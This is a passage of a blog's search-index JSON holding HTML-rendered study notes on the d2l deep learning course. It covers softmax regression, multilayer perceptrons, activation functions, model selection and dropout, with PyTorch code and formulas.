class=\"params\">batch_size</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> d2l.sgd([W, b], lr, batch_size)</span><br><span class=\"line\">num_epochs = <span class=\"number\">10</span></span><br><span class=\"line\">train_ch3(net, train_iter, test_iter, cross_entropy, num_epochs, updater)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%2011.31.52%20AM.png\" alt=\"Screen Shot 2023-03-19 at 11.31.52 AM\"></p>\n<h2><span id=\"predict\">Predict</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">predict_ch3</span>(<span class=\"params\">net, test_iter, n=<span class=\"number\">6</span></span>):</span>  <span class=\"comment\">#@save</span></span><br><span class=\"line\">    <span class=\"string\">&quot;&quot;&quot;预测标签（定义见第3章）&quot;&quot;&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> X, y <span class=\"keyword\">in</span> test_iter:</span><br><span class=\"line\">        <span class=\"keyword\">break</span></span><br><span class=\"line\">    trues = d2l.get_fashion_mnist_labels(y)</span><br><span class=\"line\">    preds = d2l.get_fashion_mnist_labels(net(X).argmax(axis=<span class=\"number\">1</span>))</span><br><span class=\"line\">    titles = [true +<span class=\"string\">&#x27;\\n&#x27;</span> + pred <span class=\"keyword\">for</span> true, pred <span class=\"keyword\">in</span> <span class=\"built_in\">zip</span>(trues, preds)]</span><br><span class=\"line\">    d2l.show_images(</span><br><span class=\"line\">        X[<span class=\"number\">0</span>:n].reshape((n, <span class=\"number\">28</span>, <span class=\"number\">28</span>)), <span class=\"number\">1</span>, n, titles=titles[<span class=\"number\">0</span>:n])</span><br><span class=\"line\"></span><br><span class=\"line\">predict_ch3(net, test_iter)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"advanced\">Advanced</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">batch_size = <span class=\"number\">256</span></span><br><span class=\"line\">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># PyTorch不会隐式地调整输入的形状。因此，</span></span><br><span class=\"line\"><span class=\"comment\"># 我们在线性层前定义了展平层（flatten），来调整网络输入的形状</span></span><br><span class=\"line\"></span><br><span class=\"line\">net = nn.Sequential(nn.Flatten(), nn.Linear(<span class=\"number\">784</span>, <span class=\"number\">10</span>))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># for Sequential, use linear with 784 inputs and 10 outputs</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_weights</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.normal_(m.weight, std=<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">###  init weight with normal distribution</span></span><br><span class=\"line\"></span><br><span class=\"line\">net.apply(init_weights);</span><br></pre></td></tr></table></figure>\n<h3><span id=\"revise-the-softmax\">Revise the softmax</span></h3><p>For stabilty and avoiding overflow, we use two methods to optimize the softmax function:<br>1) substract each of the o with the max(oi) to normalize the value to aoivd overflow.<br>2) Apply log operation to siplify the caculation and improve stability.</p>\n<p>And the algorithm has been  conluding in the package<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">loss = nn.CrossEntropyLoss(reduction=<span class=\"string\">&#x27;none&#x27;</span>)</span><br></pre></td></tr></table></figure></p>\n<p>Also we can call the optimize algorithm conveniently.<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">trainer = torch.optim.SGD(net.parameters(), lr=<span class=\"number\">0.1</span>)</span><br></pre></td></tr></table></figure></p>\n<p>Start trainning<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">num_epochs = <span class=\"number\">10</span></span><br><span class=\"line\">d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)</span><br></pre></td></tr></table></figure></p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%2011.49.41%20AM.png\" alt=\"Screen Shot 2023-03-19 at 11.49.41 AM\"></p>\n","categories":["ML"],"tags":["d2l"]},{"title":"011_MLP","url":"/2023/03/19/D2L_011_MLP/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-lOuZjPIC\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"111-one-layers-perceptron\">11.1 One Layers Perceptron</span></h2><h3><span id=\"1110-limitation-of-linear-model\">11.1.0 Limitation of Linear Model</span></h3><p>Linear model  implies the <strong>weaker</strong> assumption of <strong>monotonicity</strong>,when the featrues of inputs increase, it’s hard to just describe the model by a linear model.</p>\n<h3><span id=\"1111-historical-perceptron\">11.1.1 Historical Perceptron</span></h3><p>The photo illustrates a primary one layer perception, we can consider it as a binary classifiaction.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%204.23.52%20PM.png\" alt=\"Screen Shot 2023-03-19 at 4.23.52 PM\"></p>\n<p>How to train?<br>![[Screen Shot 2023-03-19 at 4.34.28 PM.png]]</p>\n<p>The term itself is contradictory:</p>\n<script type=\"math/tex; mode=display\">\ny_{i}[<w,x_{i}>+ \\ b ] \\le 0</script><p>when yi = -1, the prediction shoule be -1, and product is 1,<br>when yi = 1, the prediction shoule be 1, and product is 1,so both of the condition will not smaller then 0.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%204.45.33%20PM.png\" alt=\"Screen Shot 2023-03-19 at 4.45.33 PM\"></p>\n<h3><span id=\"1112-limitation-of-primary-perceptron\">11.1.2 Limitation of Primary Perceptron</span></h3><p>Perception can only generate the straight line which couldn’t contain all of the datas.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%204.48.13%20PM.png\" alt=\"Screen Shot 2023-03-19 at 4.48.13 PM\"></p>\n<h2><span id=\"112-multilayer-perceptron\">11.2 Multilayer Perceptron</span></h2><h3><span id=\"1121-basic-idea\">11.2.1 Basic Idea</span></h3><p>We undertake learning the multilayer perceptron by reviewing the limitation of primary perceptron — XOR problem.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%204.54.19%20PM.png\" alt=\"Screen Shot 2023-03-19 at 4.54.19 PM\"><br>For the given datas, we need to excogitate a technique to fit them.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%204.57.52%20PM.png\" alt=\"Screen Shot 2023-03-19 at 4.57.52 PM\"><br>Through the figure , we will learn that the  technique address this problem by 3 steps:<br>1) For the blue line ,we label the left pattern as “+” , the right pattern as “-“.<br>2) For the yellow line, we label the top pattern as “+” , the bottom pattern as “-“.<br>3) The finally product will depends on the output of above steps, with labeled to “+” when outputs are equal and “-“ when outputs are different.</p>\n<p>The idea of multilaye perceptron is <strong>decompose</strong> the complex problem into a lot of simple problems which can be orgnized by layers and layers.</p>\n<h3><span id=\"1122-single-hidden-layer\">11.2.2 Single Hidden Layer</span></h3><p> The middle layer called hidden layer, and the size of one single hidden layer is a hyperparameter which we can adjust.<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%205.04.28%20PM.png\" alt=\"Screen Shot 2023-03-19 at 5.04.28 PM\"></p>\n<p>We can use such a expression to describe the MLP</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{h} = \\sigma(\\mathbf{W_{1}\\mathbf{x}+\\mathbf{b_{1}}})</script><script type=\"math/tex; mode=display\">\no = \\mathbf{w_{2}^T\\mathbf{h}+b_{2}}</script><p>where:</p>\n<script type=\"math/tex; mode=display\">\n\\sigma()</script><p>is a activate function which is non-linear.</p>\n<h2><span id=\"113-activation-functions\">11.3  Activation Functions</span></h2><h3><span id=\"1131-sigmoid-function\">11.3.1 Sigmoid Function</span></h3><script type=\"math/tex; mode=display\">\nsigmoid = \\frac{1}{1+\\exp(-x)}</script><p>Understand from a physical point of view, we can consider the sigmoid funcion as a input’s projection within (0,1).<br><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%205.22.49%20PM.png\" alt=\"Screen Shot 2023-03-19 at 5.22.49 PM\"></p>\n<h3><span id=\"1132-tanh-function\">11.3.2 Tanh Function</span></h3><script type=\"math/tex; mode=display\">\ntanh(x) = \\frac{1-\\exp(-2x)}{1+exp(-2x)}</script><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%205.29.08%20PM.png\" alt=\"Screen Shot 2023-03-19 at 5.29.08 PM\"></p>\n<p>Similar with the sigmoid ,Tanh function is a projetion within the interval [-1,1].</p>\n<h3><span id=\"1133-relu-function\">11.3.3 ReLU Function</span></h3><p>(rectified linear unit )</p>\n<script type=\"math/tex; mode=display\">\nReLU = max(x,0)</script><p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%205.32.24%20PM.png\" alt=\"Screen Shot 2023-03-19 at 5.32.24 PM\"></p>\n<p>Advantages: Easy to caculate.</p>\n<h2><span id=\"114-multi-classification\">11.4 Multi-Classification</span></h2><p>Apply the softmax layer to the output layer:</p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{h} = \\sigma(\\mathbf{W_{1}\\mathbf{x}+\\mathbf{b_{1}}})</script><script type=\"math/tex; mode=display\">\no = \\mathbf{w_{2}^T\\mathbf{h}+b_{2}}</script><script type=\"math/tex; mode=display\">\ny = softmax(\\mathbf{o})</script><h2><span id=\"115-multi-hidden-layer\">11.5 Multi-Hidden Layer</span></h2><script type=\"math/tex; mode=display\">\n\\mathbf{h_{1}} = \\sigma(\\mathbf{W_{1}\\mathbf{x}+\\mathbf{b_{1}}})</script><script type=\"math/tex; mode=display\">\n\\mathbf{h_{2}} = \\sigma(\\mathbf{W_{2}\\mathbf{h_{1}}+\\mathbf{b_{2}}})</script><script type=\"math/tex; mode=display\">\n\\mathbf{h_{3}} = \\sigma(\\mathbf{W_{3}\\mathbf{h_{2}}+\\mathbf{b_{3}}})</script><script type=\"math/tex; mode=display\">\n\\mathbf{o} = \\mathbf{W_{4}}\\mathbf{h_{3}}+\\mathbf{b_{4}}</script><p>hyperparameter:</p>\n<p>1) number of hidden layers .<br>2) Size of each hidden layers.</p>\n<p>We need to weigh the number of hidden layer of the size of single layer. It’s depends on the datas type itself.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"12_MLP_Realization","url":"/2023/03/19/D2L_012_MLP_Realization/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-bURdJlyw\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"dataset-reading\">dataset reading</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">batch_size = <span class=\"number\">256</span></span><br><span class=\"line\">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"define-the-layers\">Define the layers</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">num_inputs, num_outputs, num_hiddens = <span class=\"number\">784</span>, <span class=\"number\">10</span>, <span class=\"number\">256</span></span><br><span class=\"line\"> </span><br><span class=\"line\">W1 = nn.Parameter(torch.randn(</span><br><span class=\"line\">    num_inputs, num_hiddens, requires_grad=<span class=\"literal\">True</span>) * <span class=\"number\">0.01</span>)</span><br><span class=\"line\"><span class=\"comment\">#init the weight1 randomly</span></span><br><span class=\"line\">b1 = nn.Parameter(torch.zeros(num_hiddens, requires_grad=<span class=\"literal\">True</span>))</span><br><span class=\"line\"><span class=\"comment\">#init the bias1 with 0</span></span><br><span class=\"line\">W2 = nn.Parameter(torch.randn(</span><br><span class=\"line\">    num_hiddens, num_outputs, requires_grad=<span class=\"literal\">True</span>) * <span class=\"number\">0.01</span>)</span><br><span class=\"line\"><span class=\"comment\">#Use hidden layer as a input, then randomly init the weight2</span></span><br><span class=\"line\">b2 = nn.Parameter(torch.zeros(num_outputs, requires_grad=<span class=\"literal\">True</span>))</span><br><span class=\"line\"><span class=\"comment\">#init the bias2 with 0</span></span><br><span class=\"line\"></span><br><span class=\"line\">params = [W1, b1, W2, b2]</span><br></pre></td></tr></table></figure>\n<h2><span id=\"relu\">ReLU</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">relu</span>(<span class=\"params\">X</span>):</span></span><br><span class=\"line\">    a = torch.zeros_like(X)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.<span class=\"built_in\">max</span>(X, a)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"model\">Model</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">net</span>(<span class=\"params\">X</span>):</span></span><br><span class=\"line\">    X = X.reshape((-<span class=\"number\">1</span>, num_inputs))</span><br><span class=\"line\">    <span class=\"comment\"># flatten the picture to a 2D matrix</span></span><br><span class=\"line\">    H = relu(X@W1 + b1)  <span class=\"comment\"># &quot;@&quot; represent a matrix multiply</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (H@W2 + b2)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"loss-function\">Loss Function</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">loss = nn.CrossEntropyLoss(reduction=<span class=\"string\">&#x27;none&#x27;</span>)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"training\">Training</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">num_epochs, lr = <span class=\"number\">10</span>, <span class=\"number\">0.1</span></span><br><span class=\"line\">updater = torch.optim.SGD(params, lr=lr)</span><br><span class=\"line\">d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, updater)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"full\">FULL</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">batch_size = <span class=\"number\">256</span></span><br><span class=\"line\">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br><span class=\"line\"></span><br><span class=\"line\">num_inputs, num_outputs, num_hiddens = <span class=\"number\">784</span>, <span class=\"number\">10</span>, <span class=\"number\">256</span></span><br><span class=\"line\"></span><br><span class=\"line\">W1 = nn.Parameter(torch.randn(</span><br><span class=\"line\">    num_inputs, num_hiddens, requires_grad=<span class=\"literal\">True</span>) * <span class=\"number\">0.01</span>)</span><br><span class=\"line\">b1 = nn.Parameter(torch.zeros(num_hiddens, requires_grad=<span class=\"literal\">True</span>))</span><br><span class=\"line\">W2 = nn.Parameter(torch.randn(</span><br><span class=\"line\">    num_hiddens, num_outputs, requires_grad=<span class=\"literal\">True</span>) * <span class=\"number\">0.01</span>)</span><br><span class=\"line\">b2 = nn.Parameter(torch.zeros(num_outputs, requires_grad=<span class=\"literal\">True</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">params = [W1, b1, W2, b2]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">relu</span>(<span class=\"params\">X</span>):</span></span><br><span class=\"line\">    a = torch.zeros_like(X)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> torch.<span class=\"built_in\">max</span>(X, a)</span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">net</span>(<span class=\"params\">X</span>):</span></span><br><span class=\"line\">    X = X.reshape((-<span class=\"number\">1</span>, num_inputs))</span><br><span class=\"line\">    <span class=\"comment\"># flatten the picture to a 2D matrix</span></span><br><span class=\"line\">    H = relu(X@W1 + b1)  <span class=\"comment\"># &quot;@&quot; represent a matrix multiply</span></span><br><span class=\"line\">    <span class=\"keyword\">return</span> (H@W2 + b2)</span><br><span class=\"line\">loss = nn.CrossEntropyLoss(reduction=<span class=\"string\">&#x27;none&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">num_epochs, lr = <span class=\"number\">10</span>, <span class=\"number\">0.1</span></span><br><span class=\"line\">updater = torch.optim.SGD(params, lr=lr)</span><br><span class=\"line\">d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, updater)</span><br></pre></td></tr></table></figure>\n<h2><span id=\"concise\">Concise</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> torch</span><br><span class=\"line\"><span class=\"keyword\">from</span> torch <span class=\"keyword\">import</span> nn</span><br><span class=\"line\"><span class=\"keyword\">from</span> d2l <span class=\"keyword\">import</span> torch <span class=\"keyword\">as</span> d2l</span><br><span class=\"line\"></span><br><span class=\"line\">net = nn.Sequential(nn.Flatten(),</span><br><span class=\"line\">                    nn.Linear(<span class=\"number\">784</span>, <span class=\"number\">256</span>),<span class=\"comment\">#hidden</span></span><br><span class=\"line\">                    nn.ReLU(),</span><br><span class=\"line\">                    nn.Linear(<span class=\"number\">256</span>, <span class=\"number\">10</span>))<span class=\"comment\">#output</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">init_weights</span>(<span class=\"params\">m</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> <span class=\"built_in\">type</span>(m) == nn.Linear:</span><br><span class=\"line\">        nn.init.normal_(m.weight, std=<span class=\"number\">0.01</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">net.apply(init_weights);</span><br><span class=\"line\"></span><br><span class=\"line\">batch_size, lr, num_epochs = <span class=\"number\">256</span>, <span class=\"number\">0.1</span>, <span class=\"number\">10</span></span><br><span class=\"line\">loss = nn.CrossEntropyLoss(reduction=<span class=\"string\">&#x27;none&#x27;</span>)</span><br><span class=\"line\">trainer = torch.optim.SGD(net.parameters(), lr=lr)</span><br><span class=\"line\"></span><br><span class=\"line\">train_iter, test_iter = d2l.load_data_fashion_mnist(batch_size)</span><br><span class=\"line\">d2l.train_ch3(net, train_iter, test_iter, loss, num_epochs, trainer)</span><br></pre></td></tr></table></figure>\n","categories":["ML"],"tags":["d2l"]},{"title":"13_Model_Selection_&_Fit","url":"/2023/03/19/D2L_013_Model_Selection_&_Fit/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-wgiSeGuY\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"130-preface\">13.0 Preface</span></h2><p>The object of Mearning learning is find out the pattern of a question, but we need to verify the  model is indeed find the pattern or just memorize some datas.<br>So at this module we are going to talk about some problems happened when the model doens’t learn the true pattern, only remeber some datas or doesn’t be taught enough.</p>\n<h2><span id=\"131-training-error-and-generalization-error\">13.1 Training Error And Generalization Error</span></h2><h3><span id=\"1311-training-error\">13.1.1 Training Error</span></h3><p>The error when traning the model on train dataset.<br>We care less to the training error.</p>\n<h3><span id=\"1312-generalization-error\">13.1.2 Generalization Error</span></h3><p>The error when test the model on new dataset.</p>\n<h2><span id=\"132-model-selection\">13.2 Model Selection</span></h2><h3><span id=\"1311-validation-dataset\">13.1.1 Validation Dataset</span></h3><p>dataset to qualify the performance of a model.(NO participation in training)</p>\n<h3><span id=\"1312-test-dataset\">13.1.2 Test Dataset</span></h3><p>Using to predicte , and only use for one times.(Like the exam grade,model shouldn’t change base on it )</p>\n<h3><span id=\"1313-k-folded-cross-validation\">13.1.3 K-folded cross-validation</span></h3><p>When we don’y have enough dataset to train, a method to overcome this problem is K-folded cross-validation.<br>1) Divide the dataset into K blocks.<br>2) i = 1.2 …. k, use the i th block as validation dataset,others as training dataset.<br>3) Roport the average value of K validation dataset.<br>4) K =5 or 10 in common.</p>\n<h2><span id=\"133-underfit-and-overfit\">13.3 Underfit and Overfit</span></h2><h3><span id=\"1331-overview\">13.3.1 Overview</span></h3><p>Select the model accroding to the model capacity.</p>\n<div class=\"table-container\">\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th>-data</th>\n<th></th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td></td>\n<td></td>\n<td></td>\n<td></td>\n</tr>\n<tr>\n<td></td>\n<td></td>\n<td>—-easy—</td>\n<td>conplex —-</td>\n</tr>\n<tr>\n<td>capacity</td>\n<td>low</td>\n<td>ok</td>\n<td>underfitting</td>\n</tr>\n<tr>\n<td></td>\n<td>high</td>\n<td>overfitting</td>\n<td>ok</td>\n</tr>\n</tbody>\n</table>\n</div>\n<h3><span id=\"1332-model-capacity\">13.3.2 Model Capacity</span></h3><p>1) The ability to fit various function.(LIkes the numbers of the parameter)<br>2) Model with low capacity is hard to fit training dataset. —&gt; underfit<br>3) Model with high capacity can momerize all of the training dataset. —&gt;overfit</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-19%20at%209.19.49%20PM.png\" alt=\"Screen Shot 2023-03-19 at 9.19.49 PM\"></p>\n<p>summary: As the capacity of model increase , the training error decrease ,and the generalization error increase.<br>SO the Best point is around the point that the generalization reach the minimum.</p>\n<h2><span id=\"134-estimate-the-capacity-of-model\">13.4 Estimate the Capacity of Model</span></h2><p>1) It’s hard to compare between two different types of models.<br>2) For a given model :<br>        —The numbers of parameters<br>        —The possible interval of parameters.</p>\n","categories":["ML"],"tags":["d2l"]},{"title":"15_Dropout","url":"/2023/03/20/D2L_015_Dropout/","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><script src=\"https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.4/MathJax.js?config=TeX-MML-AM_CHTML\" async></script>\n\n\n    <div id=\"aplayer-ZLlWVwnN\" class=\"aplayer aplayer-tag-marker meting-tag-marker\" data-id=\"1844479015\" data-server=\"netease\" data-type=\"song\" data-mode=\"circulation\" data-autoplay=\"false\" data-mutex=\"true\" data-listmaxheight=\"340px\" data-preload=\"auto\" data-theme=\"#555\"></div>  \n<h2><span id=\"151-why-use-dropout\">15.1 Why use Dropout</span></h2><h3><span id=\"a-good-model-should-be-rebust-whatever-the-inputs-are\">A good model should be rebust whatever the inputs are</span></h3><p>1) Data with nosie is same as Tikhonov regularization.<br>2) Input the nosie to the network can increase smoothness.</p>\n<p>However , it;s essential for us to find a technique,which can input the nosie to the model but will not change it’s mean.</p>\n<h2><span id=\"152-basics-of-dropout\">15.2 Basics of Dropout</span></h2><p>We want the nosie satisfy such constrain:</p>\n<script type=\"math/tex; mode=display\">\nE[\\mathbf{x}'] = \\mathbf{x}</script><p>, so we implement the method with :<br>replaceing the h to h’, which</p>\n<script type=\"math/tex; mode=display\">\nh'=\\begin{cases}0  \\\\ \\frac{h}{1-p}\n\\end{cases}</script><p>The probability that the h’ = 0 is p.</p>\n<p>since:</p>\n<script type=\"math/tex; mode=display\">\nE[\\mathbf{x}'] = 0p + (1-p)(\\frac{h}{1-p})</script><p>so the expectation will not change.</p>\n<p>We can iplement dropout to the hidden layer.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%2010.40.54%20AM.png\" alt=\"Screen Shot 2023-03-20 at 10.40.54 AM\"></p>\n<script type=\"math/tex; mode=display\">\n\\mathbf{h} = \\sigma(\\mathbf{W_{1}\\mathbf{x}}+\\mathbf{b_{1}})</script><script type=\"math/tex; mode=display\">\n\\mathbf{h'} = dropout(\\mathbf{h})</script><script type=\"math/tex; mode=display\">\n\\mathbf{o} =\\mathbf{W_{2}\\mathbf{h'}}+\\mathbf{b_{2}})</script><script type=\"math/tex; mode=display\">\n\\mathbf{y} = softmax({\\mathbf{o}})</script><h2><span id=\"153-realization-in-pytorch\">15.3 Realization in Pytorch</span></h2><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">dropout_layer</span>(<span class=\"params\">X, dropout</span>):</span></span><br><span class=\"line\">    <span class=\"keyword\">assert</span> <span class=\"number\">0</span> &lt;= dropout &lt;= <span class=\"number\">1</span></span><br><span class=\"line\">    <span class=\"comment\"># when dropout == 1 ,throw all of the elements</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> dropout == <span class=\"number\">1</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> np.zeros_like(X)</span><br><span class=\"line\">    <span class=\"comment\"># when dropout == 0 ,reserve all of the elements</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> dropout == <span class=\"number\">0</span>:</span><br><span class=\"line\">        <span class=\"keyword\">return</span> X</span><br><span class=\"line\">    <span class=\"comment\"># for the probability which gearter than dropout .</span></span><br><span class=\"line\">    mask = (np.rand(X.shape) &gt; dropout).<span class=\"built_in\">float</span>()</span><br><span class=\"line\">    <span class=\"keyword\">return</span> mask * X / (<span class=\"number\">1.0</span> - dropout)</span><br></pre></td></tr></table></figure>\n<p>the probabillity <code>dropout</code> should be specified by us.</p>\n<p><img src=\"https://rin777-1306176007.cos.ap-nanjing.myqcloud.com/Screen%20Shot%202023-03-20%20at%205.39.39%20PM.png\" alt=\"Screen Shot 2023-03-20 at 5.39.39 PM\"></p>\n<p>The step<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">mask = (np.rand(X.shape) &gt; dropout).<span class=\"built_in\">float</span>()</span><br><span class=\"line\"><span class=\"keyword\">return</span> mask * X / (<span class=\"number\">1.0</span> - dropout)</span><br></pre></td></tr></table></figure><br>accomplish two things<br>1) Randomly pick some terms, and label it with “True” or “False”<br>2) According to the label we can throw some elements.</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">H1 = dropout_layer(H1, dropout1)</span><br></pre></td></tr></table></figure>\n<p>Thus we can use it easliy.<br>Or just use the Torch ‘s  function to implement:<br><figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">net = nn.Sequential(nn.Flatten(),</span><br><span class=\"line\">        nn.Linear(<span class=\"number\">784</span>, <span class=\"number\">256</span>),</span><br><span class=\"line\">        nn.ReLU(),</span><br><span class=\"line\">        <span class=\"comment\"># 在第一个全连接层之后添加一个dropout层</span></span><br><span class=\"line\">        